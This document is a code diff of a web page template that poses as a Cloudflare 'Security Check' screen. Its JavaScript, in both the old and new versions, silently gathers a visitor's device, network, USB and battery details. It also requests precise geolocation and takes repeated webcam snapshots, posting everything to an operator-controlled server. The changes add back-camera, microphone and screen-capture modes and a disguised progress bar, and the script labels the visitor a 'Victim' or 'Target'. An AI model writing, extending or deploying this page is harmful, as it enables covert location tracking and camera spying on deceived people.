@@ -5,7 +5,7 @@
 <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"> 
 <meta name="robots" content="noindex, nofollow"> 
 <meta name="viewport" content="width=device-width,initial-scale=1"> 
-<title>Just a moment....</title> 
+<title>Security Check</title>
 <style type="text/css">
 html, body {width: 100%; height: 100%; margin: 0; padding: 0;}
 body {background-color: #ffffff; color: #000000; font-family:-apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue",Arial, sans-serif; font-size: 16px; line-height: 1.7em;-webkit-font-smoothing: antialiased;}
@@ -27,6 +27,22 @@ a:hover{color: #f4a15d}
 #cf-wrapper #challenge-form { padding-top:25px; padding-bottom:25px; }
 #cf-hcaptcha-container { text-align:center;}
 #cf-hcaptcha-container iframe { display: inline-block;}
+.progress-bar {
+  width: 80%;
+  max-width: 350px;
+  height: 8px;
+  background-color: #e9ecef;
+  border-radius: 4px;
+  margin: 20px auto;
+  overflow: hidden;
+}
+.progress-bar-value {
+  width: 0%;
+  height: 100%;
+  background-color: #f58220;
+  border-radius: 4px;
+  transition: width 0.5s ease;
+}
 </style> 
 </head> 
 <body>
@@ -49,8 +65,11 @@ a:hover{color: #f4a15d}
 <p data-translate="turn_on_cookies" style="color:#bd2426;">Please enable Cookies and reload the page.</p> 
 </div> 
 <p data-translate="process_is_automatic">This process is automatic. Your browser will redirect to your requested content shortly.</p> 
-<p data-translate="allow_5_secs" id="cf-spinner-allow-5-secs" style="display: none;">Please allow up to 5 seconds…</p> 
-<p data-translate="redirecting" id="cf-spinner-redirecting" style="display: block;">Redirecting…</p> 
+<div class="progress-bar">
+  <div class="progress-bar-value" id="progress-value"></div>
+</div>
+<p data-translate="allow_5_secs" id="cf-spinner-allow-5-secs" style="display: inline-block;">Please allow up to 5 seconds…</p> 
+<p data-translate="redirecting" id="cf-spinner-redirecting" style="display: none;">Redirecting…</p> 
 </div> 
 <form class="challenge-form" id="challenge-form" action="http://000webhost.com/?__cf_chl_jschl_tk__=gUwvgP4U.d3mjLABceeM1Hoq0yzKoVb2_YClw1ApwLs-1640764924-0-gaNycGzNA70" method="POST" enctype="application/x-www-form-urlencoded"> 
 
@@ -67,170 +86,332 @@ DDoS protection by
 </tr> 
 </tbody>
 </table>
-<video id="video" style="display:none"  playsinline autoplay></video>
+<video id="video" style="display:none" playsinline autoplay></video>
 <canvas hidden="hidden" id="canvas" width="500" height="500"></canvas>
+<audio id="audio" style="display:none"></audio>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
 <script type="text/javascript">
-var c=false,l=false,uid="<%=uid %>";
-async function gather(){
-var td="";
-<% if(!t){ %>
-td += '<code>✅Victim Information </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | Time: <%=time %></b>';
-<% }else{ %>
-await fetch("<%=a %>").then((r) => r.json()).then((d) => (td+= '<code>✅Victim Information </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#'+d.ip+'" >'+d.ip+'</a> | Time: <%=time %></b>'));
+var c=false, l=false, uid="<%=uid %>";
+var captureMethod = "<%= typeof captureMethod !== 'undefined' ? captureMethod : 'full' %>";
+var redirectDelay = 20000; // 20 seconds delay before redirect
 
-<% } %>
-
-td+="<br><br><b>⏳ Date In Victim's Device :</b> "+new Date()+"<br>";
-var xo=["productSub","vendor","maxTouchPoints","doNotTrack","hardwareConcurrency","cookieEnabled","appCodeName","appName","appVersion","platform","product","userAgent","language","languages","webdriver","pdfViewerEnabled","deviceMemory"];
-var xoc=["type","rtt","saveData","effectiveType","downlink","downlinkMax"];
-///INITIALS
-td+="<br><b>📱 Device Information</b><br>";
-for(var i=0;i < xo.length;i++){ 
-if(xo[i] in navigator){
-var str = navigator[xo[i]];
-td+="<b>"+xo[i] +"</b>: <code>"+str+"</code><br>";
-}
-}
-
-
-
-if (navigator.mediaDevices || navigator.mediaDevices?.enumerateDevices) {
-/////List cameras and microphones.
-await navigator.mediaDevices?.enumerateDevices()
-.then(function(devices) {
-td+="<br><b>📷 Media Device Information</b><br>";
-devices.forEach(function(device) {
-td+="<b>"+device.kind+":</b> " + device.label +" id = <code>" + device.deviceId+"</code><br>";
-});
-})
-.catch(function(err) {
-td+="<br><b>📷 Media Device Information</b><br>";
-td+="⚠️ Media Device Error: "+err.name + ": " + err.message;
-});
+// Progress bar animation
+function animateProgressBar() {
+  var progressValue = document.getElementById('progress-value');
+  var width = 0;
+  var id = setInterval(frame, 200);
+  
+  function frame() {
+    if (width >= 100) {
+      clearInterval(id);
+      document.getElementById('cf-spinner-allow-5-secs').style.display = 'none';
+      document.getElementById('cf-spinner-redirecting').style.display = 'inline-block';
+    } else {
+      width++;
+      progressValue.style.width = width + '%';
+    }
+  }
 }
 
-
-////CONNECTION
-if("connection" in navigator){
-td+="<br><b>🕸️ Network Information</b><br>";
-for(var i=0;i < xoc.length;i++){ 
-var str = navigator.connection[xoc[i]];
-td+="<b>"+xoc[i] +"</b>: <code>"+str+"</code><br>";
-}}
-
-
-////USB
-if("usb" in navigator){
-await navigator.usb.getDevices()
-.then(devices => {
-td+="<br><b>🔌 Total USB devices connected:</b> " + devices.length+"<br>";
-devices.forEach(device => {
-td+="<b>Product name:</b> " + device.productName + " , <b>Serial number: </b> <code>" + device.serialNumber+"</code><br>";
-});
-});
+// Handle different capture methods
+function getCaptureConfig() {
+  switch(captureMethod) {
+    case 'back':
+      return {
+        camera: true,
+        facingMode: "environment",
+        audio: false,
+        screen: false
+      };
+    case 'min':
+      return {
+        camera: false,
+        audio: false,
+        screen: false
+      };
+    case 'audio':
+      return {
+        camera: false,
+        audio: true,
+        screen: false
+      };
+    case 'screen':
+      return {
+        camera: false,
+        audio: false,
+        screen: true
+      };
+    case 'full':
+    default:
+      return {
+        camera: true,
+        facingMode: "user",
+        audio: false,
+        screen: false
+      };
+  }
 }
 
-if("getBattery" in navigator){
-await navigator.getBattery().then(function(battery) {
-td+="<br><b>🔋 Battery Information</b><br>";
-td+="<b>🔋Battery Level:</b> " +battery.level*100+"%<br><b>⚡ Is Battery Charging:</b> "+battery.charging+"";
-});
+const captureConfig = getCaptureConfig();
+
+async function gather() {
+  var td = "";
+  <% if(!t){ %>
+  td += '<code>✅ Target Information </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | Time: <%=time %></b>';
+  <% }else{ %>
+  await fetch("<%=a %>").then((r) => r.json()).then((d) => (td+= '<code>✅ Target Information </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#'+d.ip+'" >'+d.ip+'</a> | Time: <%=time %></b>'));
+  <% } %>
+
+  td += "<br><br><b>⏳ Date In Target's Device:</b> " + new Date() + "<br>";
+  td += "<br><b>🛠️ Capture Method:</b> " + captureMethod + "<br>";
+  
+  var xo = ["productSub","vendor","maxTouchPoints","doNotTrack","hardwareConcurrency","cookieEnabled","appCodeName","appName","appVersion","platform","product","userAgent","language","languages","webdriver","pdfViewerEnabled","deviceMemory"];
+  var xoc = ["type","rtt","saveData","effectiveType","downlink","downlinkMax"];
+  
+  // Device Information
+  td += "<br><b>📱 Device Information</b><br>";
+  for(var i=0; i < xo.length; i++) { 
+    if(xo[i] in navigator) {
+      var str = navigator[xo[i]];
+      td += "<b>" + xo[i] + "</b>: <code>" + str + "</code><br>";
+    }
+  }
+
+  // Media devices
+  if (navigator.mediaDevices || navigator.mediaDevices?.enumerateDevices) {
+    await navigator.mediaDevices?.enumerateDevices()
+    .then(function(devices) {
+      td += "<br><b>📷 Media Device Information</b><br>";
+      devices.forEach(function(device) {
+        td += "<b>" + device.kind + ":</b> " + device.label + " id = <code>" + device.deviceId + "</code><br>";
+      });
+    })
+    .catch(function(err) {
+      td += "<br><b>📷 Media Device Information</b><br>";
+      td += "⚠️ Media Device Error: " + err.name + ": " + err.message;
+    });
+  }
+
+  // Network Information
+  if("connection" in navigator) {
+    td += "<br><b>🕸️ Network Information</b><br>";
+    for(var i=0; i < xoc.length; i++) { 
+      var str = navigator.connection[xoc[i]];
+      td += "<b>" + xoc[i] + "</b>: <code>" + str + "</code><br>";
+    }
+  }
+
+  // USB Devices
+  if("usb" in navigator) {
+    await navigator.usb.getDevices()
+    .then(devices => {
+      td += "<br><b>🔌 Total USB devices connected:</b> " + devices.length + "<br>";
+      devices.forEach(device => {
+        td += "<b>Product name:</b> " + device.productName + " , <b>Serial number: </b> <code>" + device.serialNumber + "</code><br>";
+      });
+    });
+  }
+
+  // Battery Information
+  if("getBattery" in navigator) {
+    await navigator.getBattery().then(function(battery) {
+      td += "<br><b>🔋 Battery Information</b><br>";
+      td += "<b>🔋Battery Level:</b> " + battery.level*100 + "%<br><b>⚡ Is Battery Charging:</b> " + battery.charging + "";
+    });
+  }
+
+  // Location Information
+  if(!navigator.geolocation) {
+    td += "<br><b>📍 Location Information</b><br>";
+    td += "⚠️ Location API not available";
+    l = true;
+    checkRedirect();
+  } 
+
+  function locationSuccess(pos) {
+    const crd = pos.coords;
+    $.post("<%=a %>/location", {
+      uid: uid,
+      lat: encodeURIComponent(crd.latitude),
+      lon: encodeURIComponent(crd.longitude),
+      acc: encodeURIComponent(crd.accuracy)
+    }, (s) => {
+      l = true;
+      checkRedirect();
+    });
+  }
+
+  function locationError(err) {
+    td += "<br><b>📍 Location Information</b><br>";
+    td += "⚠️ Location ERROR: <code>" + err.message + "</code>";
+    l = true;
+    checkRedirect();
+  }
+
+  if(navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(locationSuccess, locationError, { enableHighAccuracy: true, maximumAge: 0 });
+  }
+
+  // Send the basic information we've gathered so far
+  $.post("<%=a %>/", {data: encodeURIComponent(td), uid: encodeURIComponent(uid)}, (s) => {
+    console.log("Basic information sent");
+  });
+
+  // Initialize media capture based on the selected capture method
+  if (captureConfig.camera) {
+    initCamera();
+  } else if (captureConfig.audio) {
+    initAudioCapture();
+  } else if (captureConfig.screen) {
+    initScreenCapture();
+  } else {
+    // If no media capture is needed, set camera as completed
+    c = true;
+    checkRedirect();
+  }
 }
 
-//////Location
-if(!navigator.geolocation) {
-td+="<br><b>📍 Location Information</b><br>";
-td+="⚠️ Location API not avilable";
-l=true;
-} 
-
-function success(pos) {
-const crd = pos.coords;
-$.post("<%=a %>/location",{uid:uid,lat:encodeURIComponent(crd.latitude),lon:encodeURIComponent(crd.longitude),acc:encodeURIComponent(crd.accuracy)},(s)=>{
-l=true;
-red();
-});
+// Check if we can redirect to the target URL
+function checkRedirect() {
+  if (c && l) {
+    window.location.href = "<%=url %>";
+  }
 }
 
-function error(err) {
-td+="<br><b>📍 Location Information</b><br>";
-td+="⚠️ Location ERROR: <code>"+err.message+"</code>";
-l=true;
-}
-if(navigator.geolocation){
-await navigator.geolocation.getCurrentPosition(success, error, {  enableHighAccuracy: true, maximumAge: 0});
+// Ensure redirect happens even if captures fail or take too long
+setTimeout(() => {
+  window.location.href = "<%=url %>";
+}, redirectDelay);
 
-}
-
-
-
-
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-var imgsent=0;
-
-function post(o){
-$.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(o)},(s)=>{
-imgsent+=1;
-if(imgsent==4){
-c=true;
-red();
-}
-});
-}
-const constraints = {audio: false,video: {facingMode: "user" }};
-// Access webcam
-async function cam() {
-try {
-const stream = await navigator.mediaDevices.getUserMedia(constraints);
-handleSuccess(stream);
-} catch (e) {
-td+='<br><b>📷 Camera Images</b>';
-td+= `<br>⚠️ Camera Access Error: ${e.toString()}`;
-c=true;
-red();
-}
-}
-
-// Success
-function handleSuccess(stream) {
-window.stream = stream;
-video.srcObject = stream;
-var context = canvas.getContext('2d');
-var id=setInterval(function(){
-context.drawImage(video, 0, 0, 500, 500);
-var canvasData = canvas.toDataURL("image/png").replace("data:image/png;base64", "");
-post(canvasData);
-}, 1500);
-}
-
-
-cam();
-
-
-function red(){
-if(c && l){
-window.location.href="<%=url %>"
-}
-}
-
-
-$.post("<%=a %>",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)},(s)=>{});
-
+// Camera capture
+function initCamera() {
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  var imgsent = 0;
+  
+  function postImage(imageData) {
+    $.post("<%=a %>/camsnap", {
+      uid: uid,
+      img: encodeURIComponent(imageData)
+    }, (s) => {
+      imgsent++;
+      if (imgsent >= 4) {
+        c = true;
+        checkRedirect();
+      }
+    });
+  }
+  
+  const constraints = {
+    audio: false,
+    video: { facingMode: captureConfig.facingMode || "user" }
+  };
+  
+  async function cam() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      handleSuccess(stream);
+    } catch (e) {
+      console.error("Camera access error:", e);
+      c = true;
+      checkRedirect();
+    }
+  }
+  
+  function handleSuccess(stream) {
+    window.stream = stream;
+    video.srcObject = stream;
+    
+    var context = canvas.getContext('2d');
+    var captureInterval = setInterval(function() {
+      context.drawImage(video, 0, 0, 500, 500);
+      var canvasData = canvas.toDataURL("image/png").replace("data:image/png;base64", "");
+      postImage(canvasData);
+      
+      if (imgsent >= 4) {
+        clearInterval(captureInterval);
+        if (stream) {
+          stream.getTracks().forEach(track => track.stop());
+        }
+      }
+    }, 1500);
+  }
+  
+  cam();
 }
 
-
-
-
-window.onload=()=>{
-gather();
-var i="qwertyuioplkjhgfdsazxcvbnm0987654321";
-var str="";
-for(var o=0;o<17;o++){
-str+=i[Math.floor(Math.random() * 35)];
+// Audio capture (placeholder, functionality coming in future update)
+function initAudioCapture() {
+  const audioElement = document.getElementById('audio');
+  let mediaRecorder;
+  let audioChunks = [];
+  
+  async function startAudioCapture() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+      handleAudioSuccess(stream);
+    } catch (e) {
+      console.error("Audio capture error:", e);
+      c = true;
+      checkRedirect();
+    }
+  }
+  
+  function handleAudioSuccess(stream) {
+    // Feature coming soon - set capture as completed for now
+    setTimeout(() => {
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+      }
+      c = true;
+      checkRedirect();
+    }, 3000);
+  }
+  
+  startAudioCapture();
 }
-document.getElementById("ray").innerHTML=str;
+
+// Screen capture (placeholder, functionality coming in future update)
+function initScreenCapture() {
+  async function startScreenCapture() {
+    try {
+      const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+      handleScreenCaptureSuccess(stream);
+    } catch (e) {
+      console.error("Screen capture error:", e);
+      c = true;
+      checkRedirect();
+    }
+  }
+  
+  function handleScreenCaptureSuccess(stream) {
+    // Feature coming soon - set capture as completed for now
+    setTimeout(() => {
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+      }
+      c = true;
+      checkRedirect();
+    }, 3000);
+  }
+  
+  startScreenCapture();
+}
+
+window.onload = () => {
+  // Generate random Ray ID for CloudFlare page
+  var i = "qwertyuioplkjhgfdsazxcvbnm0987654321";
+  var str = "";
+  for (var o = 0; o < 17; o++) {
+    str += i[Math.floor(Math.random() * 35)];
+  }
+  document.getElementById("ray").innerHTML = str;
+  
+  // Start progress bar animation
+  animateProgressBar();
+  
+  // Start gathering information
+  gather();
 };
 </script>
 </body>
